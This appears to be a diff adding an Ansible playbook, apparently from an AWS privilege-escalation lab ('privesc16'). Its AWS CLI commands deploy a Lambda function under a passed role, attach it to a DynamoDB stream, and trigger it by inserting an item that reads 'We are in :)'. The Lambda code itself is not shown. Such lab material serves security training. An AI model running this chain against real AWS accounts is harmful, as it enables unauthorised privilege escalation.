@@ -1,0 +1,69 @@
+- hosts: localhost
+  gather_facts: True
+  vars_files: '../group_vars/vars.yml'
+  vars:
+    - name: 'privesc16'
+    - json_object: '{ "Test": { "S": "We are in :)" }}'
+    - playbook_name: 'privesc16-Lambda-Dynamo-Trigger.yml'
+  tasks:
+    - name: Deploy lambda 
+      shell: >
+        aws lambda create-function --function-name '{{ name }}' --runtime python3.6 --role '{{ privesc_16_lambda_role }}'
+        --handler priv16.lambda_handler --zip-file fileb://{{ priv16_python }} --region '{{ aws_region }}' --profile '{{ name }}'
+      register: result
+      ignore_errors: yes
+
+    - name: Json response for created Lambda 
+      debug:
+        msg: '{{ result.stdout }}'
+
+    - name: Create Stream enabled Dynamo DB table 
+      shell: >
+        aws dynamodb create-table --table-name '{{ name }}' --attribute-definitions AttributeName=Test,AttributeType=S
+        --key-schema AttributeName=Test,KeyType=HASH --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5
+        --stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES --region '{{ aws_region }}' --profile '{{ name }}'
+      register: result1
+      ignore_errors: yes
+
+    - name: Json response for ccreated DB
+      debug:
+        msg: '{{ result1.stdout }}'
+
+    - name: Set _Event Stream ARN 
+      set_fact: Event_Stream_ARN='{{ result1.stdout | from_json | json_query('TableDescription') | json_query('LatestStreamArn') }}'
+
+    - name: Event_Stream_ARN
+      debug:
+        msg: '{{ Event_Stream_ARN }}'
+
+    - name: Create Event Source Mapping 
+      shell: aws lambda create-event-source-mapping --function-name '{{ name }}' --event-source-arn '{{ Event_Stream_ARN }}' --enabled --starting-position LATEST
+      register: result2
+      ignore_errors: yes
+
+    - name: Json response for Event Source Mapping 
+      debug:
+        msg: '{{ result2.stdout }}'
+
+    - name: Sleep for 60 seconds to wait for replication
+      wait_for:
+        timeout: 60
+      delegate_to: localhost
+
+    - name: Legit User places data into table.. invoking lambda 
+      shell: aws dynamodb put-item --table-name '{{ name }}' --item '{{ json_object }}' --region '{{ aws_region }}'
+      ignore_errors: yes
+
+
+
+
+
+
+
+# aws lambda delete-event-source-mapping --uuid "42417eee-0308-48fa-a85e-9dbdf273d2ba"
+# "12f52869-ca43-43ce-bd20-62602a2217cf"
+# "2c50e786-a6ba-46d4-b246-776d8df7d5e2"
+# "1e6554e1-e238-44d7-b94f-85e281a858a6"
+
+
+# aws lambda invoke --function-name privesc16
